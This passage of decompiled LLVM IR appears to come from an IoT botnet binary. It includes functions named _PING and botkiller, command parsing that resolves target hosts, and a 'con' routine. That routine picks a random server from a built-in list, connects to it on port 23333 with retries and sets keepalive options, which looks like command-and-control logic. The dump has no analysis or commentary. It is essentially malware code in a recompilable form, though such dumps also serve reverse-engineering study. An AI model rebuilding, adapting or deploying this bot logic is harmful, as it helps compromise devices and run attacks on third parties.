  %v3_9624 = call i32 @strncpy(i32 %v2_9614, i32 %v1_9564, i32 %storemerge17)
  store i32 %v16_9228, i32* %r0.global-to-local, align 4
  %v2_9640 = load i32, i32* %v1_9614, align 4
  %v2_9648 = add i32 %v2_9640, %storemerge17
  %v3_9650 = inttoptr i32 %v2_9648 to i8*
  store i8 0, i8* %v3_9650, align 1
  %v1_9658 = add nuw i32 %stack_var_-24.022, 1
  %v2_9678 = load i8, i8* %v5_9670.pre-phi, align 1
  %v2_967c = icmp eq i8 %v2_9678, 0
  br i1 %v2_967c, label %dec_label_pc_9684, label %dec_label_pc_9560

dec_label_pc_9684:                                ; preds = %dec_label_pc_95c8, %dec_label_pc_9560, %dec_label_pc_9524
  %v7_9760 = load i32, i32* bitcast ([4 x i8]** @global_var_1e40c.319 to i32*), align 4
  %v2_9764 = icmp eq i32 %v7_9760, 0
  br i1 %v2_9764, label %dec_label_pc_976c, label %dec_label_pc_9690

dec_label_pc_9690:                                ; preds = %dec_label_pc_9684
  store i32 %v7_9760, i32* %r0.global-to-local, align 4
  %v2_96ac = inttoptr i32 %v7_9760 to i8*
  %v3_96ac = call i32 @__GI_strcasecmp(i8* %v2_96ac, i32 %v2_935c)
  store i32 %v3_96ac, i32* %r0.global-to-local, align 4
  %v2_96d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint ([4 x i8]** @global_var_1e40c.319 to i32), i32 4) to i32*), align 4
  store i32 %v2_96d4, i32* @r4, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 38652, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_96d4)
  %v5_974465 = icmp sgt i32 %stack_var_-28.2, 1
  br i1 %v5_974465, label %dec_label_pc_9708, label %dec_label_pc_976c

dec_label_pc_9708:                                ; preds = %dec_label_pc_9690, %dec_label_pc_9708
  %storemerge1666 = phi i32 [ %v1_9730, %dec_label_pc_9708 ], [ 1, %dec_label_pc_9690 ]
  %v3_9710 = mul i32 %storemerge1666, 4
  %v2_971c = add i32 %v2_9544, %v3_9710
  %v1_9720 = inttoptr i32 %v2_971c to i32*
  %v2_9720 = load i32, i32* %v1_9720, align 4
  store i32 %v2_9720, i32* @r0, align 4
  %v0_9728 = call i32 @free()
  store i32 %v0_9728, i32* %r0.global-to-local, align 4
  %v1_9730 = add nuw nsw i32 %storemerge1666, 1
  %v5_9744 = icmp slt i32 %v1_9730, %stack_var_-28.2
  br i1 %v5_9744, label %dec_label_pc_9708, label %dec_label_pc_976c

dec_label_pc_976c:                                ; preds = %dec_label_pc_9690, %dec_label_pc_9708, %dec_label_pc_9684, %dec_label_pc_93d0, %dec_label_pc_9338, %dec_label_pc_9310
  %v12_9770 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v12_9770

; uselistorder directives
  uselistorder i32 %v1_9730, { 1, 0 }
  uselistorder i32 %v7_9760, { 1, 0, 2 }
  uselistorder i32 %.pre30, { 1, 0 }
  uselistorder i32 %storemerge17, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i32 %v1_9564, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %stack_var_-24.022, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-28.2, { 3, 1, 2, 0 }
  uselistorder i32 %storemerge15, { 2, 0, 1 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v4_943c, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge14, { 2, 0, 1 }
  uselistorder i8* %stack_var_-32.0, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %.pre27, { 1, 0 }
  uselistorder i32 %storemerge13, { 1, 0, 3, 2 }
  uselistorder i32 %v1_937c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %storemerge12, { 1, 0, 3, 2 }
  uselistorder i32 %v4_92b4, { 1, 0 }
  uselistorder i8* %v3_92a4, { 1, 0 }
  uselistorder i8* %v3_9278, { 0, 2, 1 }
  uselistorder i32 %storemerge11, { 1, 2, 3, 0, 4 }
  uselistorder i8* %v3_925c, { 1, 0 }
  uselistorder i32 %v16_9228, { 2, 3, 0, 4, 1 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %stack_var_-1124, { 3, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 25, 2, 1, 5, 3, 4, 6, 7, 8, 10, 9, 13, 11, 12, 15, 14, 17, 16, 19, 18, 21, 20, 23, 22, 26, 24, 28, 27, 0 }
  uselistorder label %dec_label_pc_976c, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_9708, { 1, 0 }
  uselistorder label %dec_label_pc_9594, { 1, 0 }
  uselistorder label %dec_label_pc_9560, { 1, 0 }
  uselistorder label %dec_label_pc_9524, { 1, 0 }
  uselistorder label %dec_label_pc_94ec, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_94e0, { 1, 0 }
  uselistorder label %dec_label_pc_949c, { 1, 0 }
  uselistorder label %dec_label_pc_939c, { 1, 0 }
  uselistorder label %dec_label_pc_92dc, { 1, 0 }
  uselistorder label %dec_label_pc_9258, { 1, 0 }
}

define i32 @_376(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 38800, i32* %stack_var_-4, align 4
  %v2_978c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_978c, i32* @fp, align 4
  %v2_97a4 = load i32, i32* @global_var_20e58.315, align 4
  %v4_97b4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_13f40.322 to i32), i32 %v2_97a4)
  %v2_97bc = load i32, i32* @global_var_20e70.302, align 4
  %v4_97d0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_13f50.327 to i32), i32 %v2_97bc)
  %v2_97d8 = load i32, i32* @global_var_20e58.315, align 4
  %v4_97e8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_13f60.329 to i32), i32 %v2_97d8)
  ret i32 %v4_97e8

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @_PING(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 38936, i32* %stack_var_-4, align 4
  %v2_9814 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9814, i32* @fp, align 4
  %v4_9834 = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_13f68.331 to i32), i32 %arg3)
  ret i32 %v4_9834

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @_352(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i8, align 1
  %stack_var_-52 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 38992, i32* %stack_var_-4, align 4
  %v2_984c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_984c, i32* @fp, align 4
  store i8* %arg3, i8** %stack_var_-52, align 4
  br label %dec_label_pc_9894.preheader

dec_label_pc_987c:                                ; preds = %dec_label_pc_98ac
  %v1_9880 = add i32 %.pre, 1
  %v5_9884 = inttoptr i32 %v1_9880 to i8*
  %v1_988c = add i32 %stack_var_-36.0, 1
  br label %dec_label_pc_9894

dec_label_pc_9894:                                ; preds = %dec_label_pc_9894.preheader, %dec_label_pc_987c
  %stack_var_-36.0 = phi i32 [ %v1_988c, %dec_label_pc_987c ], [ %stack_var_-36.119, %dec_label_pc_9894.preheader ]
  %stack_var_-28.0 = phi i8* [ %v5_9884, %dec_label_pc_987c ], [ %stack_var_-28.120, %dec_label_pc_9894.preheader ]
  %v3_9898 = load i8*, i8** %stack_var_-52, align 4
  %v3_989c = call i32 @strlen(i8* %v3_9898)
  %v3_98a4 = icmp ult i32 %stack_var_-36.0, %v3_989c
  %.pre = ptrtoint i8* %stack_var_-28.0 to i32
  br i1 %v3_98a4, label %dec_label_pc_98ac, label %dec_label_pc_98bc

dec_label_pc_98ac:                                ; preds = %dec_label_pc_9894
  %v2_98b0 = load i8, i8* %stack_var_-28.0, align 1
  %v7_98b4 = icmp eq i8 %v2_98b0, 32
  br i1 %v7_98b4, label %dec_label_pc_98bc, label %dec_label_pc_987c

dec_label_pc_98bc:                                ; preds = %dec_label_pc_9894, %dec_label_pc_98ac
  %v1_98c0 = add i32 %.pre, 1
  %v3_98cc = load i8*, i8** %stack_var_-52, align 4
  %v3_98d0 = call i32 @strlen(i8* %v3_98cc)
  %v9_98d8 = icmp eq i32 %stack_var_-36.0, %v3_98d0
  br i1 %v9_98d8, label %dec_label_pc_9b40, label %dec_label_pc_98e0

dec_label_pc_98e0:                                ; preds = %dec_label_pc_98bc
  %v5_98c4 = inttoptr i32 %v1_98c0 to i8*
  %v1_98e4 = add nuw nsw i32 %storemerge921, 1
  %v7_98f4 = icmp slt i32 %v1_98e4, 5
  br i1 %v7_98f4, label %dec_label_pc_9894.preheader, label %dec_label_pc_9910

dec_label_pc_9894.preheader:                      ; preds = %entry, %dec_label_pc_98e0
  %storemerge921 = phi i32 [ 0, %entry ], [ %v1_98e4, %dec_label_pc_98e0 ]
  %stack_var_-28.120 = phi i8* [ %arg3, %entry ], [ %v5_98c4, %dec_label_pc_98e0 ]
  %stack_var_-36.119 = phi i32 [ 0, %entry ], [ %stack_var_-36.0, %dec_label_pc_98e0 ]
  br label %dec_label_pc_9894

dec_label_pc_9904:                                ; preds = %dec_label_pc_9928
  %v1_9908 = add i32 %storemerge10, 1
  br label %dec_label_pc_9910

dec_label_pc_9910:                                ; preds = %dec_label_pc_98e0, %dec_label_pc_9904
  %storemerge10 = phi i32 [ %v1_9908, %dec_label_pc_9904 ], [ 0, %dec_label_pc_98e0 ]
  store i32 %storemerge10, i32* @r4, align 4
  %v3_9918 = call i32 @strlen(i8* %v5_98c4)
  %v0_9920 = load i32, i32* @r4, align 4
  %v3_9920 = icmp ult i32 %v0_9920, %v3_9918
  br i1 %v3_9920, label %dec_label_pc_9928, label %dec_label_pc_9910.dec_label_pc_9944_crit_edge

dec_label_pc_9910.dec_label_pc_9944_crit_edge:    ; preds = %dec_label_pc_9910
  %.pre27 = add i32 %storemerge10, %v1_98c0
  %.pre28 = inttoptr i32 %.pre27 to i8*
  br label %dec_label_pc_9944

dec_label_pc_9928:                                ; preds = %dec_label_pc_9910
  %v2_9934 = add i32 %storemerge10, %v1_98c0
  %v1_9938 = inttoptr i32 %v2_9934 to i8*
  %v2_9938 = load i8, i8* %v1_9938, align 1
  %v7_993c = icmp eq i8 %v2_9938, 32
  br i1 %v7_993c, label %dec_label_pc_9944, label %dec_label_pc_9904

dec_label_pc_9944:                                ; preds = %dec_label_pc_9928, %dec_label_pc_9910.dec_label_pc_9944_crit_edge
  %v3_9958.pre-phi = phi i8* [ %.pre28, %dec_label_pc_9910.dec_label_pc_9944_crit_edge ], [ %v1_9938, %dec_label_pc_9928 ]
  store i8 0, i8* %v3_9958.pre-phi, align 1
  %v2_9960 = load i32, i32* @global_var_20e58.315, align 4
  %v4_996c = call i32 @__GI_strcasecmp(i8* %v5_98c4, i32 %v2_9960)
  %v2_9974 = icmp eq i32 %v4_996c, 0
  br i1 %v2_9974, label %dec_label_pc_997c, label %dec_label_pc_9b40

dec_label_pc_997c:                                ; preds = %dec_label_pc_9944
  %v2_9980 = load i32, i32* @global_var_1e7f8.334, align 4
  %v2_9984 = icmp eq i32 %v2_9980, 0
  br i1 %v2_9984, label %dec_label_pc_998c, label %dec_label_pc_9b40

dec_label_pc_998c:                                ; preds = %dec_label_pc_997c
  %v3_998c = load i8*, i8** %stack_var_-52, align 4
  br label %dec_label_pc_99c0.preheader

dec_label_pc_99a8:                                ; preds = %dec_label_pc_99d8
  %v1_99ac = add i32 %.pre29, 1
  %v5_99b0 = inttoptr i32 %v1_99ac to i8*
  %v1_99b8 = add i32 %stack_var_-36.2, 1
  br label %dec_label_pc_99c0

dec_label_pc_99c0:                                ; preds = %dec_label_pc_99c0.preheader, %dec_label_pc_99a8
  %stack_var_-36.2 = phi i32 [ %v1_99b8, %dec_label_pc_99a8 ], [ %stack_var_-36.316, %dec_label_pc_99c0.preheader ]
  %stack_var_-28.2 = phi i8* [ %v5_99b0, %dec_label_pc_99a8 ], [ %stack_var_-28.317, %dec_label_pc_99c0.preheader ]
  %v3_99c4 = load i8*, i8** %stack_var_-52, align 4
  %v3_99c8 = call i32 @strlen(i8* %v3_99c4)
  %v3_99d0 = icmp ult i32 %stack_var_-36.2, %v3_99c8
  %.pre29 = ptrtoint i8* %stack_var_-28.2 to i32
  br i1 %v3_99d0, label %dec_label_pc_99d8, label %dec_label_pc_99e8

dec_label_pc_99d8:                                ; preds = %dec_label_pc_99c0
  %v2_99dc = load i8, i8* %stack_var_-28.2, align 1
  %v7_99e0 = icmp eq i8 %v2_99dc, 32
  br i1 %v7_99e0, label %dec_label_pc_99e8, label %dec_label_pc_99a8

dec_label_pc_99e8:                                ; preds = %dec_label_pc_99c0, %dec_label_pc_99d8
  %v1_99ec = add i32 %.pre29, 1
  %v3_99f8 = load i8*, i8** %stack_var_-52, align 4
  %v3_99fc = call i32 @strlen(i8* %v3_99f8)
  %v9_9a04 = icmp eq i32 %stack_var_-36.2, %v3_99fc
  br i1 %v9_9a04, label %dec_label_pc_9b40, label %dec_label_pc_9a0c

dec_label_pc_9a0c:                                ; preds = %dec_label_pc_99e8
  %v5_99f0 = inttoptr i32 %v1_99ec to i8*
  %v1_9a10 = add nuw nsw i32 %storemerge1118, 1
  %v7_9a20 = icmp slt i32 %v1_9a10, 3
  br i1 %v7_9a20, label %dec_label_pc_99c0.preheader, label %dec_label_pc_9a3c

dec_label_pc_99c0.preheader:                      ; preds = %dec_label_pc_998c, %dec_label_pc_9a0c
  %storemerge1118 = phi i32 [ 0, %dec_label_pc_998c ], [ %v1_9a10, %dec_label_pc_9a0c ]
  %stack_var_-28.317 = phi i8* [ %v3_998c, %dec_label_pc_998c ], [ %v5_99f0, %dec_label_pc_9a0c ]
  %stack_var_-36.316 = phi i32 [ 0, %dec_label_pc_998c ], [ %stack_var_-36.2, %dec_label_pc_9a0c ]
  br label %dec_label_pc_99c0

dec_label_pc_9a30:                                ; preds = %dec_label_pc_9a54
  %v1_9a34 = add i32 %storemerge12, 1
  br label %dec_label_pc_9a3c

dec_label_pc_9a3c:                                ; preds = %dec_label_pc_9a0c, %dec_label_pc_9a30
  %storemerge12 = phi i32 [ %v1_9a34, %dec_label_pc_9a30 ], [ 0, %dec_label_pc_9a0c ]
  store i32 %storemerge12, i32* @r4, align 4
  %v3_9a44 = call i32 @strlen(i8* %v5_99f0)
  %v0_9a4c = load i32, i32* @r4, align 4
  %v3_9a4c = icmp ult i32 %v0_9a4c, %v3_9a44
  br i1 %v3_9a4c, label %dec_label_pc_9a54, label %dec_label_pc_9a3c.dec_label_pc_9a70_crit_edge

dec_label_pc_9a3c.dec_label_pc_9a70_crit_edge:    ; preds = %dec_label_pc_9a3c
  %.pre30 = add i32 %storemerge12, %v1_99ec
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_9a70

dec_label_pc_9a54:                                ; preds = %dec_label_pc_9a3c
  %v2_9a60 = add i32 %storemerge12, %v1_99ec
  %v1_9a64 = inttoptr i32 %v2_9a60 to i8*
  %v2_9a64 = load i8, i8* %v1_9a64, align 1
  %v7_9a68 = icmp eq i8 %v2_9a64, 32
  br i1 %v7_9a68, label %dec_label_pc_9a70, label %dec_label_pc_9a30

dec_label_pc_9a70:                                ; preds = %dec_label_pc_9a54, %dec_label_pc_9a3c.dec_label_pc_9a70_crit_edge
  %v3_9a84.pre-phi = phi i8* [ %.pre31, %dec_label_pc_9a3c.dec_label_pc_9a70_crit_edge ], [ %v1_9a64, %dec_label_pc_9a54 ]
  store i8 0, i8* %v3_9a84.pre-phi, align 1
  store i32 %v1_99ec, i32* @r0, align 4
  %v2_9a8c = call i32 @inet_addr(i32 %v1_99ec)
  %v5_9a94 = trunc i32 %v2_9a8c to i8
  store i8 %v5_9a94, i8* %stack_var_-40, align 1
  %v3_9a9c = icmp eq i8 %v5_9a94, -1
  br i1 %v3_9a9c, label %dec_label_pc_9aa4, label %dec_label_pc_9ae4

dec_label_pc_9aa4:                                ; preds = %dec_label_pc_9a70
  %v2_9aa8 = call i32 @__GI_gethostbyname(i32 %v1_99ec)
  %v2_9ab8 = icmp eq i32 %v2_9aa8, 0
  br i1 %v2_9ab8, label %dec_label_pc_9b40, label %dec_label_pc_9ac0

dec_label_pc_9ac0:                                ; preds = %dec_label_pc_9aa4
  %v2_9ac0 = ptrtoint i8* %stack_var_-40 to i32
  %v1_9ac8 = add i32 %v2_9aa8, 16
  %v2_9ac8 = inttoptr i32 %v1_9ac8 to i32*
  %v3_9ac8 = load i32, i32* %v2_9ac8, align 4
  %v1_9acc = inttoptr i32 %v3_9ac8 to i32*
  %v2_9acc = load i32, i32* %v1_9acc, align 4
  store i32 %v2_9acc, i32* @r1, align 4
  %v1_9ad4 = add i32 %v2_9aa8, 12
  %v2_9ad4 = inttoptr i32 %v1_9ad4 to i32*
  %v3_9ad4 = load i32, i32* %v2_9ad4, align 4
  store i32 %v2_9ac0, i32* @r0, align 4
  store i32 %v3_9ad4, i32* @r2, align 4
  %v0_9ae0 = call i32 @memcpy()
  %v2_9af0.pre = load i8, i8* %stack_var_-40, align 1
  br label %dec_label_pc_9ae4

dec_label_pc_9ae4:                                ; preds = %dec_label_pc_9a70, %dec_label_pc_9ac0
  %v12_9b4426 = phi i32 [ %v0_9ae0, %dec_label_pc_9ac0 ], [ %v2_9a8c, %dec_label_pc_9a70 ]
  %v2_9af0 = phi i8 [ %v2_9af0.pre, %dec_label_pc_9ac0 ], [ %v5_9a94, %dec_label_pc_9a70 ]
  store i8 %v2_9af0, i8* bitcast (i8** @global_var_1e7f7.337 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_1e7f4.336 to i8*), align 4
  store i32 256, i32* @global_var_1e7f8.334, align 4
  br label %dec_label_pc_9b40

dec_label_pc_9b40:                                ; preds = %dec_label_pc_98bc, %dec_label_pc_99e8, %dec_label_pc_997c, %dec_label_pc_9944, %dec_label_pc_9aa4, %dec_label_pc_9ae4
  %v12_9b44 = phi i32 [ 0, %dec_label_pc_997c ], [ %v4_996c, %dec_label_pc_9944 ], [ 0, %dec_label_pc_9aa4 ], [ %v12_9b4426, %dec_label_pc_9ae4 ], [ %v3_99fc, %dec_label_pc_99e8 ], [ %v3_98d0, %dec_label_pc_98bc ]
  ret i32 %v12_9b44

; uselistorder directives
  uselistorder i32 %storemerge12, { 1, 0, 3, 2 }
  uselistorder i32 %v1_9a10, { 1, 0 }
  uselistorder i32 %v1_99ec, { 2, 4, 3, 0, 1, 5 }
  uselistorder i8* %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %stack_var_-36.2, { 2, 0, 1, 3 }
  uselistorder i32 %storemerge10, { 1, 0, 3, 2 }
  uselistorder i32 %v1_98e4, { 1, 0 }
  uselistorder i8* %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %stack_var_-36.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %stack_var_-52, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_9b40, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_9ae4, { 1, 0 }
  uselistorder label %dec_label_pc_9a3c, { 1, 0 }
  uselistorder label %dec_label_pc_99c0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_99e8, { 1, 0 }
  uselistorder label %dec_label_pc_9910, { 1, 0 }
  uselistorder label %dec_label_pc_9894.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_98bc, { 1, 0 }
}

define i32 @_433(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-74 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 39776, i32* %stack_var_-4, align 4
  %v2_9b5c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9b5c, i32* @fp, align 4
  %v2_9b74 = load i32, i32* @global_var_20e58.315, align 4
  store i32 %v2_9b74, i32* @r0, align 4
  %v0_9b7c = call i32 @free()
  %v1_9b88 = call i32 @makestring(i32 %v0_9b7c)
  %v2_9b94 = ptrtoint i32* %stack_var_-74 to i32
  %v4_9ba0 = call i32 @strcpy(i32 %v2_9b94, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_13f74.342, i32 0, i32 0))
  store i32 %v1_9b88, i32* @r1, align 4
  %v2_9bb0 = bitcast i32* %stack_var_-74 to i8*
  %v3_9bb0 = call i32 @strcat(i8* %v2_9bb0, i32 %v1_9b88)
  store i32 %v2_9b94, i32* @global_var_20e58.315, align 4
  %v1_9bc0 = call i32 @botkiller(i32 %v3_9bb0)
  ret i32 %v1_9bc0

; uselistorder directives
  uselistorder i32 %v1_9b88, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @con() local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_9bd8 = load i32, i32* @fp, align 4
  store i32 39904, i32* %stack_var_-4, align 4
  %v2_9bdc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9bdc, i32* @fp, align 4
  %v2_9d04 = ptrtoint i32* %stack_var_-40 to i32
  %v2_9d70 = ptrtoint i32* %stack_var_-48 to i32
  %v3_9dc0 = bitcast i32* %stack_var_-44 to %sockaddr*
  br label %dec_label_pc_9be8

dec_label_pc_9be8:                                ; preds = %dec_label_pc_9be8.backedge, %entry
  store i32 -1, i32* @global_var_20e5c.344, align 4
  store i32 1, i32* %stack_var_-48, align 4
  %v2_9c00 = load i32, i32* @global_var_1e7ec.346, align 4
  %v2_9c04 = icmp eq i32 %v2_9c00, 0
  br i1 %v2_9c04, label %dec_label_pc_9c0c, label %dec_label_pc_9c40

dec_label_pc_9c0c:                                ; preds = %dec_label_pc_9be8
  %v0_9c0c = call i32 @random()
  %v2_9c18 = load i32, i32* @global_var_1e3fc.348, align 4
  %v2_9c24 = srem i32 %v0_9c0c, %v2_9c18
  %v4_9c34 = mul i32 %v2_9c24, 4
  %v5_9c34 = add i32 %v4_9c34, ptrtoint ([22 x i8]** @global_var_1e400.351 to i32)
  %v6_9c34 = inttoptr i32 %v5_9c34 to i32*
  %v7_9c34 = load i32, i32* %v6_9c34, align 4
  store i32 %v7_9c34, i32* @global_var_20e64.353, align 4
  br label %dec_label_pc_9c40

dec_label_pc_9c40:                                ; preds = %dec_label_pc_9be8, %dec_label_pc_9c0c
  store i32 0, i32* @global_var_1e7ec.346, align 4
  br label %dec_label_pc_9c4c

dec_label_pc_9c4c:                                ; preds = %dec_label_pc_9c4c, %dec_label_pc_9c40
  %v0_9c58 = call i32 @socket()
  store i32 %v0_9c58, i32* @global_var_20e5c.344, align 4
  %v1_9c70 = icmp slt i32 %v0_9c58, 0
  br i1 %v1_9c70, label %dec_label_pc_9c4c, label %dec_label_pc_9c78

dec_label_pc_9c78:                                ; preds = %dec_label_pc_9c4c
  %v2_9c7c = load i32, i32* @global_var_20e64.353, align 4
  store i32 %v2_9c7c, i32* @r0, align 4
  %v1_9c84 = call i32 @inet_addr(i32 %v2_9c7c)
  %v2_9c8c = icmp eq i32 %v1_9c84, 0
  br i1 %v2_9c8c, label %dec_label_pc_9cb0, label %dec_label_pc_9c94

dec_label_pc_9c94:                                ; preds = %dec_label_pc_9c78
  %v2_9c98 = load i32, i32* @global_var_20e64.353, align 4
  store i32 %v2_9c98, i32* @r0, align 4
  %v1_9ca0 = call i32 @inet_addr(i32 %v2_9c98)
  %v3_9ca8 = icmp eq i32 %v1_9ca0, -1
  br i1 %v3_9ca8, label %dec_label_pc_9cb0, label %dec_label_pc_9d24

dec_label_pc_9cb0:                                ; preds = %dec_label_pc_9c94, %dec_label_pc_9c78
  %v2_9cb4 = load i32, i32* @global_var_20e64.353, align 4
  %v1_9cbc = call i32 @__GI_gethostbyname(i32 %v2_9cb4)
  %v2_9ccc = icmp eq i32 %v1_9cbc, 0
  br i1 %v2_9ccc, label %dec_label_pc_9cd4, label %dec_label_pc_9cf4

dec_label_pc_9cd4:                                ; preds = %dec_label_pc_9cb0
  store i32 0, i32* @global_var_20e64.353, align 4
  %v2_9ce4 = load i32, i32* @global_var_20e5c.344, align 4
  %v1_9cec = call i32 @__libc_close(i32 %v2_9ce4)
  br label %dec_label_pc_9be8.backedge

dec_label_pc_9be8.backedge:                       ; preds = %dec_label_pc_9cd4, %dec_label_pc_9ea4
  br label %dec_label_pc_9be8

dec_label_pc_9cf4:                                ; preds = %dec_label_pc_9cb0
  %v1_9cf8 = add i32 %v1_9cbc, 16
  %v2_9cf8 = inttoptr i32 %v1_9cf8 to i32*
  %v3_9cf8 = load i32, i32* %v2_9cf8, align 4
  %v1_9cfc = inttoptr i32 %v3_9cf8 to i32*
  %v2_9cfc = load i32, i32* %v1_9cfc, align 4
  %v1_9d0c = add i32 %v1_9cbc, 12
  %v2_9d0c = inttoptr i32 %v1_9d0c to i32*
  %v3_9d0c = load i32, i32* %v2_9d0c, align 4
  store i32 %v3_9d0c, i32* @r2, align 4
  %v3_9d1c = call i32 @bcopy(i32 %v2_9cfc, i32 %v2_9d04, i32 %v3_9d0c)
  br label %dec_label_pc_9d3c

dec_label_pc_9d24:                                ; preds = %dec_label_pc_9c94
  %v2_9d28 = load i32, i32* @global_var_20e64.353, align 4
  store i32 %v2_9d28, i32* @r0, align 4
  %v1_9d30 = call i32 @inet_addr(i32 %v2_9d28)
  store i32 %v1_9d30, i32* %stack_var_-40, align 4
  br label %dec_label_pc_9d3c

dec_label_pc_9d3c:                                ; preds = %dec_label_pc_9cf4, %dec_label_pc_9d24
  store i32 2, i32* %stack_var_-44, align 4
  %v1_9d54 = call i32 @htons(i32 23333)
  %v2_9d6c = load i32, i32* @global_var_20e5c.344, align 4
  %v3_9d80 = call i32 @ioctl(i32 %v2_9d6c, i32 21537, i32 %v2_9d70)
  %v2_9d88 = call i32 @__GI_time(i32* null)
  br label %dec_label_pc_9e84

dec_label_pc_9d98:                                ; preds = %dec_label_pc_9e84
  %v0_9d98 = call i32 @__errno_location()
  %v2_9da4 = inttoptr i32 %v0_9d98 to i32*
  store i32 0, i32* %v2_9da4, align 4
  %v2_9dac = load i32, i32* @global_var_20e5c.344, align 4
  %v4_9dc0 = call i32 @__libc_connect(i32 %v2_9dac, %sockaddr* %v3_9dc0, i32 16)
  %v2_9dc8 = icmp eq i32 %v4_9dc0, 0
  br i1 %v2_9dc8, label %dec_label_pc_9de4, label %dec_label_pc_9dd0

dec_label_pc_9dd0:                                ; preds = %dec_label_pc_9d98
  %v0_9dd0 = call i32 @__errno_location()
  %v1_9dd8 = inttoptr i32 %v0_9dd0 to i32*
  %v2_9dd8 = load i32, i32* %v1_9dd8, align 4
  %v7_9ddc = icmp eq i32 %v2_9dd8, 106
  br i1 %v7_9ddc, label %dec_label_pc_9de4, label %dec_label_pc_9e54

dec_label_pc_9de4:                                ; preds = %dec_label_pc_9dd0, %dec_label_pc_9d98
  %v2_9de8 = load i32, i32* @global_var_20e5c.344, align 4
  %v6_9e04 = call i32 @__GI_setsockopt(i32 %v2_9de8, i32 1, i32 13, i32* null, i32 0)
  %v2_9e0c = load i32, i32* @global_var_20e5c.344, align 4
  %v6_9e28 = call i32 @__GI_setsockopt(i32 %v2_9e0c, i32 1, i32 2, i32* null, i32 0)
  %v2_9e30 = load i32, i32* @global_var_20e5c.344, align 4
  %v6_9e4c = call i32 @__GI_setsockopt(i32 %v2_9e30, i32 1, i32 9, i32* null, i32 0)
  store i32 %v3_9bd8, i32* @fp, align 4
  ret i32 %v6_9e4c

dec_label_pc_9e54:                                ; preds = %dec_label_pc_9dd0
  %v0_9e54 = call i32 @__errno_location()
  %v1_9e5c = inttoptr i32 %v0_9e54 to i32*
  %v2_9e5c = load i32, i32* %v1_9e5c, align 4
  %v7_9e60 = icmp eq i32 %v2_9e5c, 115
  br i1 %v7_9e60, label %dec_label_pc_9e7c, label %dec_label_pc_9e68

dec_label_pc_9e68:                                ; preds = %dec_label_pc_9e54
  %v0_9e68 = call i32 @__errno_location()
  %v1_9e70 = inttoptr i32 %v0_9e68 to i32*
  %v2_9e70 = load i32, i32* %v1_9e70, align 4
  %v7_9e74 = icmp eq i32 %v2_9e70, 114
  br i1 %v7_9e74, label %dec_label_pc_9e7c, label %dec_label_pc_9ea4

dec_label_pc_9e7c:                                ; preds = %dec_label_pc_9e68, %dec_label_pc_9e54
  %v1_9e80 = call i32 @sleep(i32 1)
  br label %dec_label_pc_9e84

dec_label_pc_9e84:                                ; preds = %dec_label_pc_9d3c, %dec_label_pc_9e7c
  %v2_9e88 = call i32 @__GI_time(i32* null)
  %v2_9e98 = sub i32 %v2_9e88, %v2_9d88
  %tmp = icmp ult i32 %v2_9e98, 10
  br i1 %tmp, label %dec_label_pc_9d98, label %dec_label_pc_9ea4

dec_label_pc_9ea4:                                ; preds = %dec_label_pc_9e68, %dec_label_pc_9e84
  store i32 0, i32* @global_var_20e64.353, align 4
  %v2_9eb4 = load i32, i32* @global_var_20e5c.344, align 4
  %v1_9ebc = call i32 @__libc_close(i32 %v2_9eb4)
  br label %dec_label_pc_9be8.backedge

; uselistorder directives
  uselistorder i32 %v3_9d0c, { 1, 0 }
